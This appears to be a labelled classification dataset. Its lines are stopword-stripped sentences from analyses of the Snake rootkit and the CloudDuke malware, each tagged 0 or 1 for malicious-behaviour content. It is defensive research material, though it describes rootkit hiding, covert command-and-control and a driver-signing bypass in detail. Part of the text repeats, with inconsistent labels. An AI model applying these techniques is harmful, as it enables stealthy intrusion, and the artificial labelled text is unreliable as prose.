Did continue re-build disclosed infrastructure tools go away get jobs another line work ? In cases disclosure little impact operation	0
For example McAfee ShadyRAT report 2011 absolutely change attacks group behind	0
However Mandiant released APT1 report 2013 noticeable reduction activity group – much tools infrastructure seen since	0
In September 2010 issue Foreign Affairs magazine former US Deputy Secretary Defense William J. Lynn discussed cyber-attack happened two years previously DoD's classified computer networks	0
Lynn described foreign intelligence agency planted malicious code networks aim transferring data servers control	0
The article included oft-quoted phrase 'digital beachhead ' describe undoubtedly significant compromise US military systems	0
Further reports press kept story alive 2011 since threat received remarkably little attention	0
However operation behind attacks continued little modification tools techniques spite widespread attention years ago	0
They use highly sophisticated malware tools maintain persistent access targets	1
These tools used covert communications number different modes present significant challenges traditional security technologies detect	1
There threats come go whilst others permanent features landscape	0
In paper describe tools techniques one sophisticated persistent threats track	0
We hope help victims identify intrusions understand need improve defences	0
Cyber security collaborative effort – operation described paper raises bar security community efforts keep attackers cyber-space	0
When antivirus back-end classification platforms identify malware family analysed malicious sample assign generic names '' Trojan Horse '' '' Agent ''	0
The variant letters also assigned automatically using hexavigesimal ( Base26 ) notation	0
That variant letters auto-assigned starting '' A '' followed '' B '' '' Z ''	0
Next comes '' AA '' '' AB '' '' ZZ ''	0
After variant letters start '' AAA '' '' AAB '' '' ZZZ ''	0
Back 2008 unknown malicious file discovered auto-classified '' Agent.BTZ '' meaning registered unknown malicious sample # 1,898 anti-virus classification system	0
It n't given actual name generic one	0
Meanwhile internally authors behind malware using naming systems - specific titles file components projects '' snake '' '' uroburos '' '' sengoku '' '' snark '' used denote variants framework	0
A recent report German security company GData described sample '' uroburos '' variant framework	0
Their report revealed complex nature malware family showed operation behind '' Agent.BTZ '' continued	0
As result disclosure also releasing technical analysis threat including timeline known samples known Command-and-Control ( C & C ) servers indicators aid investigators discovering attacks	0
Reverse engineering recent malware samples shows much advanced variants Agent.BTZ though still sharing many similarities encryption methods original	0
Further investigation allowed us locate related samples compiled 2006 2014 spanning across several distinctive generations	0
The first section report gives overview samples collected reported timelines derived analysis	0
Snake 's architecture turned quite interesting	0
We identified two distinct variants highly flexible two different techniques establishing maintaining presence target system	1
In general operation relies kernel mode drivers making rootkit	0
It designed covertly install backdoor compromised system hide presence components provide communication mechanism C & C servers enable effective data exfiltration mechanism	1
At time Snake exposed flexibility conduct operations engaging noticeably different architectures	0
In first model network communications carried userland - i.e	1
area computer system application software executes	0
In another model network communications handled kernel mode driver - i.e	1
area lower level system code device drivers run	0
The choice architecture used may depend specific target 's environment allowing Snake operators choose suitable architecture deployed	1
In architectures kernel mode driver installed usermode DLL injected driver system processes	1
In architectures 32-bit 64-bit code involved	0
In order distinguish architectures call usermode-centric kernel-centric architectures respectively	0
The remainder report gives detailed explanation two Snake architectures embed target system communicate outside world	0
We also provided set technical indicators Appendix enable organisations security research community identify compromises	0
In total collected 100 unique files related espionage toolkit	0
Many submitted online malware analysis websites victims investigators several years	0
In many cases source country information submission available	0
These allow us visualise distribution countries malware seen Whilst view likely tip iceberg give us initial insight profile targets Snake operations	0
Other useful visualisations operations come compile timestamps	0
Below shown table count number files sample set recent years	0
Two samples compiled late January 2014 show activity ongoing	0
Plotting day week samples compiled shows familiar pattern analysts modern cyber-attacks	0
The creators malware operate working week like professional	0
The single sample set compiled Saturday outlier n't alter conclusion	0
Similarly plotting hour day samples compiled reveals another human pattern – working day	0
This adjusted UTC+4 show possible fit operators ' local time	0
The usermode-centric architecture Snake known used 2011 till 2014 recent sample compiled January 28 2014	0
With architecture Snake driver mainly used load DLL module usermode processes use module communications	1
One analysed samples exposed multiple debug messages source control check-in logs	0
It clear messages allowed deployed driver - possibly operational security lapse	0
However give insight internal structure source code	0
For example analysed driver gave away following source file names The source control check-in log examples showing names developers 'vlad ' 'gilg ' It also exposed project name particular variant 'sengoku ' Now 's time execute driver see	0
When first executed driver creates device named \Device\vstor32 symbolic link \DosDevices\vstor32	1
This device used userland/kernel communications	1
Next drops DLL % windows % directory - DLL carried body driver binary chunk XOR 0xAA applied top driver decrypts first	1
Depending variant DLL dropped either random name hard-coded name mscpx32n.dll	1
The purpose DLL injected user-mode processes	1
Some variants Snake carry DLL modules installed service run within taskhost.exe services.exe processes	1
Next driver sets hooks following kernel-mode APIs After calls PsSetCreateProcessNotifyRoutine ( ) order notified whenever new process started	1
The handlers hooks along notification callback allow Snake stay persistent system able infect newly created processes restore driver file case gets deleted	1
Another set hooks sets designed hide presence Snake components system The driver watches userland processes see load web pages	1
As long user using Internet Snake stays dormant process communicates web servers	1
However soon user goes online driver intercepts event immediately injects malicious DLL module process initiated connection ( browser )	1
Once injected module initiates polling one hard-coded C & C servers	1
The purpose behaviour blend Snake 's traffic browser traffic bypassing firewalls keeping low profile time	1
By communicating within process also communicates even technically savvy user find challenging detect Snake traffic among legitimate traffic	0
The reason behind difficulty modern web pages often fetch pages different web servers including data additional scripts CSS templates advertising contents analytics data blogs social networking data etc	0
When intercepted purpose analysis traffic may literally represent hundreds DNS HTTP requests made popular website news website open	0
Hiding DNS/HTTP requests among busy network traffic allows Snake rootkit stay unnoticed	1
In order test Snake 's communications C & C servers still able clearly distinguish traffic small tool built generate GET request web server running analysed system	0
The tool named chrome.exe order trigger malware communications	0
As long test tool named chrome.exe make requests memory stayed pristine	0
There injections made driver	0
As soon tool made first GET requests driver immediately injected malicious DLL module module started producing following traffic ↓ The domain names C & C servers relies hard-coded body malware	1
Some examples given full list known domains given Appendix D As seen traffic dump malware first resolves domain name C & C	1
Next fetches file /D/pub.txt expects server respond string '' 1 '' acknowledging 's active Once acknowledged asks server command server returns new command execute The command receives C & C ( swim.onlinewebshop.net ) encrypted	1
In order decrypt malware first applies XOR mask bytes start offset 0x40 An identical XOR mask also used Agent.BTZ	1
Next calculates confirms CRC32 checksum within command decrypts data using Number Theory Library ( NTL ) makes sure command destined current host matching ID field	1
Once decrypted malware interprets received command reflected malware log ( new C & C server address highlighted ) After malware connects new C & C asking another command The command receives called UpLoad uploads collected logs server cleans logs The files uploads stored inside home directory % windows % \ $ NtUninstallQ [ random ] $ [ random ] random number	1
For example Snake 's home directory could C \WINDOWS\ $ NtUninstallQ812589 $	0
The files within directory used rootkit store configuration log data	1
When decrypted XOR key used Agent.BTZ files expose following contents Analysis sample reveals supports 3 modes fetching C & C commands	1
• In first mode relies Windows Internet ( WinINet ) APIs HttpOpenRequest ( ) HttpSendRequest ( ) InternetReadFile ( ) etc	1
• In second mode uses Windows Sockets 2 ( Winsock ) APIs WSAStartup ( ) socket ( ) connect ( ) send ( ) etc	1
• In third mode works 'pipe server ' mode passes web requests interested ( client ) pipe server runs within Windows Explorer ( explorer.exe ) and/or Internet Explorer ( iexplore.exe ) processes	1
Memory pipes common mechanism Inter-Process Communications ( IPC )	0
When pipe server reads requests pipes performs web request behalf client using WinINet APIs effectively serves proxy	0
The diagram demonstrates last 'pipe server ' mode Snake operation The diagram illustrates operation steps 1-4 1 First malicious driver embedded DLL module injects DLL system process services.exe ; loaded DLL function 'pipe server ' mode	1
2 As soon driver detects usermode process goes online ( e.g browser ) inject malicious DLL module ; depending operational mode DLL may start communicating C & C directly	1
3 In 'pipe mode ' operation injected DLL start communicating pipe server sending messages established inter-process communication pipes	1
4 Once task communication C & C delegated pipe server start communicating C & C bypassing host-based firewalls keep infected system process white-list	1
The reason behind pipes usage 'legitimise ' outbound web requests forcing originate host firewall- friendly system services	1
Pipe server special mode injected DLL	0
In order switch mode dedicated thread spawned listen IPC messages received pipes	1
The memory pipes used Snake named Apart GET / POST requests pipe clients ( infected usermode processes ) may also ask pipe server perform operations behalf saving data temporary file copy / delete files save configuration data registry aforementioned ShellCore value	1
This delegation tasks designed keep infected processes radar behavioural analysis tools long possible	1
Another reason overcome account restrictions imposed browser process order able write files / registry	1
To delegate different types tasks clients send messages pipe server using following task identification headers The usermode component Snake communicates kernel-mode driver via device called \\.\vstor32 ( created kernel \Device\vstor32 )	1
In communication protocol driver uses IOCTL code 0x222038	0
To write data opens device CreateFile ( '' \\.\vstor32 '' ) calls DeviceIoControl ( ) API handle IOCTL code 0x222038	1
Configuration parameters along initial set domain names hard-coded within body DLL	1
However data appears defined structures likely DLL could generated stand-alone builder 'patches ' DLL new/updated list C & C	0
Analysis commands performed malware suggests following capabilities Together commands provide complete backdoor functionality allowing remote attacker full control compromised system	1
The ability update driver rely communication capabilities means components Snake flexible making possible existence hybrid ( kernel-centric usermode-centric ) architectures	1
For example virtual partitions used kernel-centric Snake variants kernel-mode driver responsible communications	1
If driver installed via update usermode component instructed delegate file upload task driver copying necessary logs shared virtual partition physically located compromised host thus accessible kernel	1
This particular architecture relies kernel-mode driver carry network communications	1
The usermode DLLs still injected system processes perform high-level tasks	1
The delivery mechanism known may distributed via thumb-drive phishing email attachment delivered via exploit across network ( e.g	1
using reconnaissance tool explained later )	0
Infection starts dropper penetrating compromised system allowed run	1
Once executed dropper installs kernel mode driver pre-defined location	1
The dropper 32-bit run 32-bit 64-bit Windows OS ( WoW64 mode )	0
On 32-bit OS install 32-bit driver	1
On 64-bit OS install 64-bit driver	1
The analysed 32-bit dropper creates driver following location However different samples may use different path driver file name	1
For example samples exposed filenames fdisk32.sys A0009547.sys Ultra3.sys	0
The filename dropper could rknginst.exe fdiskmon.exe	0
Once executed driver first makes sure registered pre-defined name Ultra3	0
Other samples may different registration name ~ROOT	0
The registration ensured creation following registry entries The driver flags following events notification purposes The rootkit places number hooks	1
The first API hooks IoCreateDevice ( )	1
The installed hook handler calls original API checks name device netbt afd	1
If install TDI filter driver	1
If device name Null Beep tcpip Nsiproxy activate enabling hooks designed hide presence Snake system set access control lists messaging system	1
In order hide components driver hooks following APIs For example hook handlers registry-related APIs block access registry entries contain name driver	1
In one example rootkit blocks access registry entries contain strings '' Ultra3 '' '' ~ROOT ''	1
The ZwReadFile ( ) hook handler block access home directory rootkit keeps file	1
In one analysed kernel-centric Snake samples home directory hard-coded % windows % \ $ NtUninstallQ817473 $ blocked file read access directory	1
The ZwClose ( ) hook handler used inject DLL module userland processes	1
The hook handler ZwTerminateProcess ( ) checks process shut svchost.exe	1
If considers system shutdown unloads usermode DLL deactivates network drivers like ZwShutdownSystem ( ) hook handler gets invoked	1
The ObOpenObjectByName ( ) hook designed hide presence virtual partitions ( described later )	1
To encrypt data stored virtual partitions driver sets hook another API To re-infect usermode process svchost.exe re-enable network drivers rootkit hooks APIs Snake proceeds task deep packet inspection modification	1
In order accomplish registers callout driver Windows Filtering Platform ( WFP ) architecture first introduced Windows Vista nowadays normally used antivirus and/or intrusion detection systems inspect/block malicious traffic	1
Snake sets filters layers FWPMLAYERSTREAMV4 FWPMLAYERALEFLOWESTABLISHEDV4 TCP/ IP stack callout driver notified whenever TCP connection established browser	1
When happens rootkit triggers event named \BaseNamedObjects\wininetactivate	1
When data arrives intercepted FwpsCopyStreamDataToBuffer0 ( ) API scanned presence hidden commands C & C	1
The driver inspects bidirectional network data per stream basis 's located right stream data path	1
An ability manipulate data streams provided packet injection logic allowing Snake covertly insert traffic destined C & C servers In order qualify browser usermode process must following names In addition WFP Snake also hooks Transport Driver Interface ( TDI ) network routines setting TDI filter driver	1
TDI considered deprecated removed future versions Microsoft Windows 's still supported Windows 7	0
Being registered TDI driver device stack Snake hooks TCP calls	1
This way intercepts requests along parameters via IRP ( IO request package ) hooks	1
By 'sniffing ' requests inspect traffic looking parsing GET / POST HTTP requests also SMTP communications order distinguish commands addressed	1
If rootkit detects OS version pre-Vista ( e.g Windows XP ) Windows Server 2008 ( e.g Windows Server 2003 ) invoke FwpsStreamInjectAsync0 ( ) API order generate outbound requests	1
Whenever client establishes connections TDI driver also 'pulse ' \BaseNamedObjects\wininetactivate event like WPF driver 's component order notify userland service event	1
The data driver intercepts along important notifications passed userland DLL processed	1
If data contains commands C & C DLL module expected execute report results back driver delivered back C & C	1
For NDIS versions 5.X Snake rootkit contains code installs NDIS filter intermediate driver	1
This driver set miniport driver ( driver communicates physical device ) protocol driver ( driver implements protocol e.g	1
TCP/IP )	0
The driver registered NdisIMRegisterLayeredMiniport ( ) API	1
After drivers hooks following exports within ndis.sys The rootkit contains code installs NDIS filter driver NDIS 6.0 NDIS filter driver configuration stored registry entry The driver registered NdisFRegisterFilterDriver ( ) API	1
After drivers hooks following exports within ndis.sys ( NDIS 6.0 ) Another set exports attempts hook ndis.sys ( NDIS 6.0 ) With hooks installed whenever network adapter driver attempts register NDIS whenever attempt install NDIS intermediate driver NDIS filter driver hook handlers register Snake 's MiniportXxx functions NDIS library	1
With miniport handler functions send / receive data using private TCP/IP stack bypassing firewall hooks making open ports invisible scanners	1
The Snake rootkit registers Network Driver Interface Specification ( NDIS ) protocol driver	1
Whenever underlying miniport driver receives data network calls NDIS invoking data receive indication function NdisMIndicateReceiveNetBufferLists ( )	1
When happens NDIS invokes Snake 's hook function ( ProtocolReceiveNetBufferLists ) process received data	1
To send data back protocol driver defines data list NETBUFFERLIST structures passes NDIS calling NdisSendNetBufferLists ( )	1
NDIS turn calls miniport driver's MiniportSendNetBufferLists ( ) function forward data underlying miniport driver	1
Being able fully manipulate traffic 3 different levels ( NDIS protocol driver TDI Driver WPF callout driver ) Snake able 'inject ' traffic existing communications reach external components time parse incoming traffic detect traffic addressed As driver intercepts connections ( e.g	1
TDIRECEIVE TDI event ClientEventReceive ( ) event notification triggered TDI Filter Driver ) parses incoming HTTP SMTP traffic see authenticated Snake traffic	1
The authentication implemented decrypting data making sure starts markers 0xDEADBEAF 0xC001BA5E ( appear derive 'DEAD BEEF ' 'COOL BASE ' )	1
Here specific steps By observing behaviour one might wonder driver expecting HTTP SMTP clients ? Why act like HTTP/SMTP server processing client traffic serving back normal responses per protocol ? For example HTTP driver respond messages like '' HTTP/1.1 200 OK '' '' HTTP/1.1 500 Server Error ''	1
For SMTP traffic communicates back normal SMTP server responses '' 250 Sender OK '' '' 503 Bad sequence commands '' etc	0
The reason behind behaviour driver acting mode like proxy routing requests infected hosts remote C & C server	1
Another opportunity mode unlocks peer-to-peer network mode centralised C & C	0
The infected hosts capable transferring following peer-2-peer commands defining fragment size reliability parameters new peer information peer impersonation flags etc	0
Once incoming data authenticated decrypted driver passes DLL using memory pipes	1
For example HTTP traffic arrival may send traffic data memory pipe \Device\NamedPipe\isapihttp send received peer-2-peer command message writepeernfo= [ IPADDRESS PORT ] 0fragnoscrambling=Y0 another memory pipe called \Device\NamedPipe\isapidg	1
In order log activity driver writes log data pipe \Device\NamedPipe\isapilog DLL could log data log files	1
Full list named pipes used communications provided Messages submitted pipes wrapped structures	1
The structures appear contain headers allow pipe server runs within infected userland module identify messages first unwrap structures accordingly	1
For example message headers could Once received pipes unwrapped/decoded data handled usermode DLL per data intention - whether 's traffic sniffing task peer-2-peer client logic logging task task saving received files virtual volumes	1
The driver creates virtual file volumes encrypted storage files configuration data The volumes mounted virtual file systems RawDisk1 RawDisk2	1
The first partition created following steps The hook installed rootkit IofCallDriver ( ) API provides on-the-fly data encryption/decryption whenever data written read volume	1
The encryption algorithm based CAST-128 hard-coded key stored rootkit body	1
As result whenever data saved volume Hd1 scrambled on-the-fly reflected persistent storage file hotfix.dat physically located within rootkit 's 'home ' directory Analysis hotfix.dat file contents reveals 's fully encrypted file flat entropy	1
Thus possible reveal contents Snake 's volume accessing contents file ( unless encryption broken )	0
Enlisting contents created volume possible along creating files However soon IofCallDriver ( ) hook removed 'dir ' command fail hook rootkit decrypt scrambled volume The second volume \\.\Hd2 mapped file computer switched contents lost	0
Thus could used temporary cache storage	0
The data stored \\.\Hd2 encrypted way first volume 's data	1
Both volumes appear set FAT volumes	1
An attempt read data volumes code This produce following results For \\.\Hd1 For \\.\Hd2 The ability keep data TrueCrypt-like volumes provides Snake powerful ability exchange data usermode DLL volumes accessible usermode kernel mode	1
Static analysis code reveals Snake driver uses virtual volumes store data additional files	1
For example stores message queue file called The message queue indicates asynchronous communication model kernel mode driver usermode DLL e.g	1
pass commands configuration parameters binary images additional Snake components	0
Other files may also found virtual volume klog conlog dump rknginst.exe rknginst.exe could name original dropper log files could potentially contain executed command outputs intercepted keystrokes output logs	1
The 64-bit version Snake must deal number additional security protections implemented 64-bit editions Microsoft Windows significant kernel driver signature validation Kernel Patch Protection ( commonly known PatchGuard )	0
PatchGuard feature 64-bit Windows aims prevent modification Windows kernel something often performed malware attempting hide infected system	0
Although PatchGuard successful preventing kernel patching initialised several published bypass approaches exist	0
The technique used Snake appears similar approaches	0
The driver signing policy enforced 64-bit versions Windows Vista onwards requires kernel-mode drivers signed valid digital signature	0
The Snake dropper contains 32-bit 64-bit unsigned drivers successfully load unsigned 64-bit driver 64-bit version Windows XP – driver signing enforced resort tricks OS version	1
In case order ensure driver loaded automatically startup dropper install 64-bit driver 64-bit Windows XP way installs 32-bit driver 32-bit version Windows XP	1
On 64-bit versions Windows Vista behaves differently	1
Firstly 64-bit unsigned driver file created usual However driver registered ; registered instead dropper	1
To dropper first copies The dropper registers service ensure starts every time Windows booted creating values Now comes interesting part dropper manage load 64-bit unsigned driver 64-bit versions Windows Vista later versions 64-bit Windows 7/8 ? The answer Yes	1
Does resort using bootkit technology used past bypass protections load unsigned 64-bit drivers ? The answer No	0
Bootkits must overwrite Master Boot Record ( MBR ) antivirus products well trained catch kind bad behavior	0
The masterminds behind Snake rootkit seem well aware resorted instead leveraging vulnerability well-known virtualization product called VirtualBox product made Oracle widely used researchers analyse malware	0
VirtualBox driver version 1.6.2 released June 2 2008	0
Two months later August 2008 security researchers reported main driver component signed entity '' innotek Gmbh '' contained privilege escalation vulnerability	0
In nutshell VirtualBox software installs driver called VBoxDrv	0
The driver controlled Input/Ouput Control Codes ( 32-bit values called IOCTL ) passed along DeviceIoControl ( ) API	0
One documented transfer methods system uses pass data caller DeviceIoControl ( ) API driver called METHODNEITHER	0
As per MSDN documentation METHODNEITHER special transfer type Input/Output Request Packet ( IRP ) supplies user-mode virtual addresses input output buffers without validating mapping	0
It responsibility driver validate addresses sent user mode order make sure addresses valid usermode addresses	0
The source code vulnerable driver ( shown ) demonstrates integer value rc variable first derived input parameters pDevObj ( device object ) pIrp ( request packet )	0
Next integer value written UserBuffer - arbitrary address pointed input parameter pIrp ( request packet )	0
As validations made UserBuffer attacker craft input parameters define address within kernel memory patch data patch Now vulnerable driver used weapon patch kernel memory malware needs patch content variable nt gCiEnabled boolean variable '' Code Integrity Enabled '' marks whether system booted WinPE mode	1
When running WinPE mode Code Integrity control therefore enabling mode patching one bit Code Integrity verification disabled unsigned 64-bit driver loaded	1
This variable used within function SepInitializeCodeIntegrity ( ) implemented within CI.dll 's function CiInitialize ( ) imported NT core ( ntoskrnl.exe )	0
In order find variable kernel memory Snake dropper loads copy NT core image ( ntoskrnl.exe ) locates import CI.dll 's function CiInitialize ( ) SepInitializeCodeIntegrity ( ) within	1
Then parses function 's code locate offset variable	1
Once located content variable nt gCiEnabled patched kernel memory 64-bit unsigned driver loaded	1
This explains Snake dropper registers service start time Windows starts order install vulnerable VBox driver first pass malformed structure disable Code Integrity control DeviceIoControl ( ) API call finally load driver	1
In order able perform steps dropper must first obtain Administrator privileges	1
It attempts running MS09-025 MS10-015 exploits target system	1
These exploits bundled within dropper resource section executable files	0
Other resources embedded within dropper 32-bit 64-bit builds driver tool creating NTFS file systems initial message queue file written virtual volume	1
The message queue file contains configuration data libraries injected usermode processes	1
The usermode DLLs injected kernel-mode driver userland system process ( e.g	1
explorer.exe ) The rkctlWin32.dll/rkctlx64.dll module uses following hard-coded named pipe communications The remote commands receives appear designed control components Snake The injsnakeWin32.dll/injsnakex64.dll module exports 61 functions	1
It designed perform high-level tasks When DLL activates reads configuration parameters configuration queue driver creates virtual volume	1
One parameters defines pipe name ( ) DLL use communications	1
The remote commands received Snake DLL module designed set various communication parameters To post data DLL use following User-Agent string '' Mozilla/4.0 ( compatible ; MSIE 6.0 ) ''	1
It may rely following Internet Media types ( MIME types ) data exfiltration Request type uses either POST GET C & C server resource name /default.asp	1
One Snake components could downloaded remote C & C server identified network reconnaissance tool	1
When run command line tool logic defined command line switches tool enumerates network hosts detects Windows RPC services enabled endpoints	1
It carries list interface identifiers associated named pipes	1
It uses identifiers write message read message associated named pipes	1
By knowing RPC services running successfully fingerprint network hosts mimicking Metasploit 's logic OS fingerprinting via SMB	1
The fingerprinting allows reveal following characteristics host found network The data retrieves encrypted saved configuration file % system % \vtmon.bin	1
This file encrypted NTL-based ( Number Theory Library ) algorithm uploaded usermode-centric Snake rootkit C & C server along configuration files mtmon.sdb mtmon32.sdb gstatsnd.bin gstat.bin gstat32.bin log files found % windows % \ $ NtUninstallQ [ random ] $ directory	1
By using function remote attacker identify potentially exploitable hosts located network victim	1
The attacker may craft exploit hosts possibly using Metasploit framework deliver generated shellcode back reconnaissance tool applied identified hosts running tool 'expos ' switch	1
If tool successfully delivers payload exploits remote host ( ) replicate infection across network taking control new hosts thus repeating infection cycle spreading infection	1
Unlike traditional worm techniques process rather manual danger fact attacker flexibly craft new attack methods adjusting hosts present within network thus preying weakest ( least updated vulnerable ) victims along path	1
As seen check-in logs found within one recent samples time span covers almost 6 years January 2007 till December 2012 aligned first reports Agent.BTZ	0
It 's worth noting Agent.BTZ used XOR key logs recent variants Log files created latest samples Snake compiled 2013 2014 successfully decrypted XOR key	1
Other similarities include usage virtual partition \\.\Vd1 temporary file named FA.tmp usage files named mswmpdat.tlb wmcache.nld winview.ocx	0
The cyber-espionage operation behind Snake rootkit well established sample comiled January 2006 indicates activity would begun least 2005	0
It also sophisticated using complex techniques evading host defences providing attackers covert communication channels	1
Toolmarks left behind authors 'vlad ' & 'gilg ' leave tantalizing clues personas behind	0
From technical perspective Snake demonstrates two different approaches task building cyber-espionage toolkit	0
One approach delegate network communication engine usermode code backed usermode rootkit	1
Another approach carry communications kernel-mode driver challenging task	1
The complexity usermode-centric approach par Rustock rootkit - uses similar techniques	0
It 's old well-polished technology evolved years demonstrated resilience survivability stress security counter- measures	0
The complexity kernel-centric architecture Snake quite unique	0
This architecture designed grant Snake much flexibility possible	0
When infected hosts cut outside world needs one host connected online	1
The traffic routed host make external control data exfiltration still possible	1
The presence reconnaissance tool Snake operators ' framework suggests existence arsenal infiltration tools designed compromise system find way replicate hosts infect spread infection even	1
As demonstrated backdoor commands allow Snake provide remote attackers full remote access compromised system	1
Its ability hibernate staying fully inactive number days makes detection time difficult	1
The analysed code suggests even file system registry operations delegated infected module another module order stay unnoticed behaviour analysis engines antivirus products overcome account restrictions browser processes injected module could still write files sensitive registry hives	1
The logs dumps creates hidden virtual volumes contributes stealthiness	1
A great deal attention also given keep network communications quiet possible	1
Its ability generate malicious traffic whenever user goes online start loading web pages allows 'blend ' legitimate communications	1
We expect much uncovered researchers coming weeks capabilities operation fleshed	0
However implied opening section view threat permanent feature landscape	0
Whether dismantle toolset start scratch continue using tools exposed remains seen	0
For targets though considerable challenge keeping secrets safe sensitive networks certainly continue years come	0
Recent weeks seen outing two new additions Duke group 's toolset SeaDuke CloudDuke	0
Of SeaDuke simple trojan made interesting fact 's written Python	0
And even curiously SeaDuke built - support Windows Linux first cross - platform malware observed Duke group	0
While SeaDuke single - albeit cross- platform - trojan CloudDuke appears entire toolset malware components " solutions " Duke group apparently calls	0
These components include unique loader downloader one two different trojan components	0
CloudDuke also greatly expands Duke group 's usage cloud storage services specifically Microsoft 's OneDrive channel command control well exfiltration stolen data	0
Finally recent CloudDuke spear - phishing campaigns born striking resemblance CozyDuke spear - phishing campaigns year ago	0
Last week Symantec Palo Alto Networks published research SeaDuke newer addition arsenal trojans used Duke group	0
While older malware Duke group always written combination C C++ programming languages well assembly language SeaDuke peculiarly written Python multiple layers obfuscation	0
This Python code usually compiled Windows executables using py2exe pyinstaller	0
However Python code designed work Windows Linux	0
We therefore suspect Duke group also using SeaDuke Python code target Linux victims	0
This first time seen Duke group employ malware target Linux platforms	0
Last week also saw Palo Alto Networks Kaspersky Labs publish research malware components respectively called MiniDionis CloudLook	0
MiniDionis CloudLook components larger malware toolset call CloudDuke	0
This toolset consists malware components provide varying functionality partially relying shared code framework always using loader	0
Based PDB strings found samples malware authors refer CloudDuke components " solutions " names " DropperSolution " " BastionSolution " " OneDriveSolution "	0
A list PDB strings observed	0
The first CloudDuke components observed downloader internally called " DropperSolution "	0
The purpose downloader download execute additional malware victim 's system	1
In observed cases downloader attempt connect compromised website download encrypted malicious payload downloader decrypt execute	1
Depending way downloader configured cases may first attempt log Microsoft 's cloud storage service OneDrive retrieve payload	0
If payload available OneDrive downloader revert previously mentioned method downloading compromised websites	0
We also observed two distinct trojan components CloudDuke toolset	0
The first internally called " BastionSolution " trojan Palo Alto Networks described research " MiniDionis "	0
Interestingly BastionSolution appears functionally exact copy SeaDuke real difference choice programming language	0
BastionSolution also makes significant use code framework apparently internally called " Z "	0
This framework provides classes functionality encryption compression randomization network communications	0
Classes " Z " framework encryption randomization classes also used second trojan component CloudDuke toolset	0
This second component internally called " OneDriveSolution " especially interesting relies Microsoft 's cloud storage service OneDrive command control channel	1
To achieve OneDriveSolution attempt log OneDrive preconfigured username password	0
If successful OneDriveSolution proceed copy data victim 's computer OneDrive account	1
It also search OneDrive account files containing commands malware execute	1
All CloudDuke " solutions " use loader piece code whose primary purpose decrypt embedded encrypted solution load memory execute	1
The Duke group often employed loaders malware unlike previous loaders used CloudDuke loader much versatile support multiple methods loading executing final payload well ability write disk execute additional malware components	0
CloudDuke spear - phishing campaigns similarities CozyDuke CloudDuke recently spread via spear - phishing emails targets reportedly including organizations US Department Defense	0
These spear - phising emails contained links compromised websites hosting zip archives contain CloudDuke - laden executables	0
In cases executing executables resulted two additional files written victim 's hard disk	1
The first files decoy audio file PDF file second one CloudDuke loader embedding CloudDuke downloader - called " DropperSolution "	0
In cases victim presented decoy file background downloader proceeded download execute one CloudDuke trojans " OneDriveSolution " " BastionSolution "	0
Interestingly however CloudDuke spear - phishing campaigns observed July born striking resemblance CozyDuke spear - phishing campaigns seen almost exactly year ago beginning July 2014	0
In spear - phishing campaigns decoy document exact PDF file " US letter fax test page " ( 28d29c702fdf3c16f27b33f3e32687dd82185e8b )	0
Similarly URLs hosting malicious files campaigns purported related eFaxes	0
It also interesting note case CozyDuke - inspired CloudDuke spear - phishing campaign downloading execution malicious archive linked emails resulted execution CloudDuke downloader execution " BastionSolution " component thereby skipping one step process described CloudDuke spear - phishing campaigns	0
Developing even single multipurpose malware toolset never mind many requires time resources	0
Therefore seems logical attempt reuse code supporting frameworks different toolsets	0
The Duke group however appear taken step SeaDuke CloudDuke component BastionSolution rewriting code multiple programming languages	0
This obvious benefits saving time resources providing two malware toolsets similar inside appear completely different outside	0
This way discovery one toolset immediately lead discovery second toolset	0
The Duke group long suspected ties Russian state running espionage operation unusually long time - especially lately - unusual brazenness	0
These latest CloudDuke SeaDuke campaigns appear clear sign Duke 's planning stop time soon	0
Research post Artturi ( @lehtior2 ) F - Secure detects CloudDuke Trojan W32/CloudDuke B Trojan W64/CloudDuke B Samples	0
Compromised servers used command control	0
Compromised websites used host CloudDuke	0
Recent weeks seen outing two new additions Duke group 's toolset SeaDuke CloudDuke	0
Of SeaDuke simple trojan made interesting fact 's written Python	0
And even curiously SeaDuke built - support Windows Linux first cross - platform malware observed Duke group	0
While SeaDuke single - albeit cross- platform - trojan CloudDuke appears entire toolset malware components " solutions " Duke group apparently calls	0
These components include unique loader downloader one two different trojan components	0
CloudDuke also greatly expands Duke group 's usage cloud storage services specifically Microsoft 's OneDrive channel command control well exfiltration stolen data	0
Finally recent CloudDuke spear - phishing campaigns born striking resemblance CozyDuke spear - phishing campaigns year ago	0
Last week Symantec Palo Alto Networks published research SeaDuke newer addition arsenal trojans used Duke group	0
While older malware Duke group always written combination C C++ programming languages well assembly language SeaDuke peculiarly written Python multiple layers obfuscation	0
This Python code usually compiled Windows executables using py2exe pyinstaller	0
However Python code designed work Windows Linux	0
We therefore suspect Duke group also using SeaDuke Python code target Linux victims	0
This first time seen Duke group employ malware target Linux platforms	0
Last week also saw Palo Alto Networks Kaspersky Labs publish research malware components respectively called MiniDionis CloudLook	0
MiniDionis CloudLook components larger malware toolset call CloudDuke	0
This toolset consists malware components provide varying functionality partially relying shared code framework always using loader	0
Based PDB strings found samples malware authors refer CloudDuke components " solutions " names " DropperSolution " " BastionSolution " " OneDriveSolution "	0
A list PDB strings observed	0
The first CloudDuke components observed downloader internally called " DropperSolution "	0
The purpose downloader download execute additional malware victim 's system	1
In observed cases downloader attempt connect compromised website download encrypted malicious payload downloader decrypt execute	1
Depending way downloader configured cases may first attempt log Microsoft 's cloud storage service OneDrive retrieve payload	0
If payload available OneDrive downloader revert previously mentioned method downloading compromised websites	0
We also observed two distinct trojan components CloudDuke toolset	0
The first internally called " BastionSolution " trojan Palo Alto Networks described research " MiniDionis "	0
Interestingly BastionSolution appears functionally exact copy SeaDuke real difference choice programming language	0
BastionSolution also makes significant use code framework apparently internally called " Z "	0
This framework provides classes functionality encryption compression randomization network communications	0
Classes " Z " framework encryption randomization classes also used second trojan component CloudDuke toolset	0
This second component internally called " OneDriveSolution " especially interesting relies Microsoft 's cloud storage service OneDrive command control channel	0
To achieve OneDriveSolution attempt log OneDrive preconfigured username password	0
If successful OneDriveSolution proceed copy data victim 's computer OneDrive account	1
It also search OneDrive account files containing commands malware execute	1
All CloudDuke " solutions " use loader piece code whose primary purpose decrypt embedded encrypted solution load memory execute	1
The Duke group often employed loaders malware unlike previous loaders used CloudDuke loader much versatile support multiple methods loading executing final payload well ability write disk execute additional malware components	0
CloudDuke recently spread via spear - phishing emails targets reportedly including organizations US Department Defense	0
These spear - phising emails contained links compromised websites hosting zip archives contain CloudDuke - laden executables	0
In cases executing executables resulted two additional files written victim 's hard disk	1
